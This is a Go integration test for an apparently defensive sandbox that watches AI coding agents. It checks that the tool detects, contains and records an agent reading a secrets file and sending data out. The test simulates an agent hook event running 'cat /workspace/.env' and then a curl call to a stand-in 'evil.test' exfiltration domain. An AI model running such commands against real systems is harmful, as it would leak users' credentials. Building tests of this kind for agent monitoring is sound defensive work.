package response_test

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/eth0x1/aegis/internal/correlate"
	"github.com/eth0x1/aegis/internal/events"
	"github.com/eth0x1/aegis/internal/network"
	"github.com/eth0x1/aegis/internal/observer"
	"github.com/eth0x1/aegis/internal/response"
	"github.com/eth0x1/aegis/internal/sandbox"
	"github.com/eth0x1/aegis/internal/session"
	"github.com/eth0x1/aegis/internal/workspace"
)

func requireDocker(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("docker"); err != nil {
		t.Skip("docker binary missing")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if out, err := exec.CommandContext(ctx, "docker", "info").CombinedOutput(); err != nil {
		t.Skipf("docker daemon unavailable: %s", strings.TrimSpace(string(out)))
	}
}

func TestIntegrationExfiltrationContainmentLive(t *testing.T) {
	requireDocker(t)
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
	defer cancel()

	root := t.TempDir()
	os.WriteFile(filepath.Join(root, ".env"), []byte("API_KEY=super-secret-value\n"), 0o600)
	os.WriteFile(filepath.Join(root, "app.py"), []byte("print('v1')\n"), 0o644)

	stateRoot := t.TempDir()
	mgr, err := session.Create(stateRoot, root, "claude", "strict")
	if err != nil {
		t.Fatal(err)
	}
	defer mgr.Close()
	sessionID := mgr.Snapshot().SessionID

	ws := filepath.Join(mgr.Dir(), "workspace")
	snap, err := workspace.Snapshot(root, ws)
	if err != nil {
		t.Fatal(err)
	}
	mgr.SetWorkspace(ws)
	if err := observer.InjectHooks(ws); err != nil {
		t.Fatal(err)
	}
	if err := workspace.SaveManifest(mgr.Dir(), snap.Manifest); err != nil {
		t.Fatal(err)
	}
	for _, s := range []session.State{session.StateSnapshotting, session.StateStarting, session.StateRunning} {
		if err := mgr.Transition(s, nil); err != nil {
			t.Fatal(err)
		}
	}

	store, err := events.Open(mgr.Dir())
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	gw, err := network.New(sessionID, network.ProfileStrict, store)
	if err != nil {
		t.Fatal(err)
	}
	if err := gw.Up(ctx); err != nil {
		t.Fatalf("gateway up: %v", err)
	}
	defer gw.Down(context.Background())

	var sb *sandbox.Sandbox
	engine := correlate.NewEngine(sessionID, correlate.DefaultWindow)
	var fireOnce sync.Once
	fired := make(chan struct{})
	handler := func(e events.Event) {
		inc := engine.Observe(e)
		if inc == nil {
			return
		}
		fireOnce.Do(func() {
			close(fired)
			r := &response.Responder{
				Ctrl:       sb,
				Mgr:        mgr,
				Store:      store,
				SessionDir: mgr.Dir(),
				Workspace:  ws,
				Manifest:   snap.Manifest,
			}
			go func() {
				if cerr := r.ContainCritical(ctx, *inc); cerr != nil {
					t.Logf("containment error: %v", cerr)
				}
			}()
		})
	}
	gw.SetOnEvent(handler)

	sb = sandbox.New(sessionID, ws, store)
	sb.NetworkArgs = gw.AgentNetworkArgs()
	if err := sb.Start(ctx); err != nil {
		t.Fatalf("sandbox start: %v", err)
	}

	rawPath := observer.RawLogPath(ws)
	tailer := observer.StartTailer(rawPath, store, nil)
	tailer.SetOnEvent(handler)
	tailCtx, stopTail := context.WithCancel(ctx)
	defer stopTail()
	go tailer.Run(tailCtx, 50*time.Millisecond)

	time.Sleep(300 * time.Millisecond)

	probeDomain := fmt.Sprintf("exfil-probe-%d.evil.test", time.Now().UnixNano())

	hookPayload := `{"session_id":"` + sessionID + `","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat /workspace/.env"}}`
	if _, err := sb.Exec(ctx, "printf '%s' '"+hookPayload+"' | /workspace/.aegis/bin/hook.sh"); err != nil {
		t.Fatalf("hook exec failed: %v", err)
	}

	deadline := time.After(10 * time.Second)
	for engine.ArmedCount() == 0 {
		select {
		case <-deadline:
			t.Fatal("timed out waiting for hook event to arm correlation engine")
		case <-ctx.Done():
			t.Fatal("context cancelled waiting for hook event")
		case <-time.After(50 * time.Millisecond):
		}
	}
	t.Logf("correlation engine armed: %d event(s)", engine.ArmedCount())

	curlRes, curlErr := sb.Exec(ctx, "curl -sS --max-time 15 https://"+probeDomain+" ; echo RC=$?")
	t.Logf("curl probe: err=%v stdout=%q stderr=%q", curlErr, curlRes.Stdout, curlRes.Stderr)

	select {
	case <-fired:
	case <-time.After(30 * time.Second):
		dump, _ := events.ReadAll(mgr.Dir())
		var summary []string
		for _, e := range dump {
			summary = append(summary, e.Source+"/"+e.Type+"/"+
				fmt.Sprintf("%v", e.Data["decision"]))
		}
		t.Fatalf("incident never fired (state=%s armed=%d) events=%v",
			mgr.Snapshot().State, engine.ArmedCount(), summary)
	}

	waitDeadline := time.After(45 * time.Second)
	for mgr.Snapshot().State != session.StateTerminated {
		select {
		case <-waitDeadline:
			t.Fatalf("session never reached TERMINATED (state=%s)", mgr.Snapshot().State)
		default:
		}
		time.Sleep(200 * time.Millisecond)
	}
	if mgr.Snapshot().Outcome != "compromised" {
		t.Errorf("outcome = %q", mgr.Snapshot().Outcome)
	}

	nameCheck, _ := exec.Command("docker", "ps", "-a", "--filter",
		"name="+sb.Name, "--format", "{{.Names}}").Output()
	if strings.TrimSpace(string(nameCheck)) != "" {
		t.Errorf("agent container still present after containment: %q", string(nameCheck))
	}

	var rec struct {
		EvidenceImage string `json:"evidence_image"`
	}
	ib, err := os.ReadFile(filepath.Join(mgr.Dir(), "incident.json"))
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(ib, &rec); err != nil {
		t.Fatal(err)
	}
	if rec.EvidenceImage == "" {
		t.Fatal("incident.json lacks evidence image reference")
	}
	if err := exec.Command("docker", "image", "inspect", rec.EvidenceImage).Run(); err != nil {
		t.Errorf("evidence image snapshot missing: %v", err)
	}

	for _, f := range []string{"report.md", "network.jsonl", "hook-events.jsonl",
		"policy-decisions.jsonl", "container-inspect.json"} {
		if _, err := os.Stat(filepath.Join(mgr.Dir(), f)); err != nil {
			t.Errorf("evidence file %s missing", f)
		}
	}
	md, _ := os.ReadFile(filepath.Join(mgr.Dir(), "report.md"))
	for _, want := range []string{"COMPROMISED", correlate.RuleSensitiveEgress, probeDomain} {
		if !strings.Contains(string(md), want) {
			t.Errorf("report.md missing %q", want)
		}
	}

	evts, err := events.ReadAll(mgr.Dir())
	if err != nil {
		t.Fatal(err)
	}
	hasIncidentEvent := false
	for _, e := range evts {
		if e.Type == events.TypeIncident && e.Severity == events.SevCritical {
			hasIncidentEvent = true
		}
	}
	if !hasIncidentEvent {
		t.Error("no critical canonical incident event in authoritative log")
	}

	appPy, _ := os.ReadFile(filepath.Join(root, "app.py"))
	if string(appPy) != "print('v1')\n" {
		t.Error("trusted project mutated during incident response")
	}
}
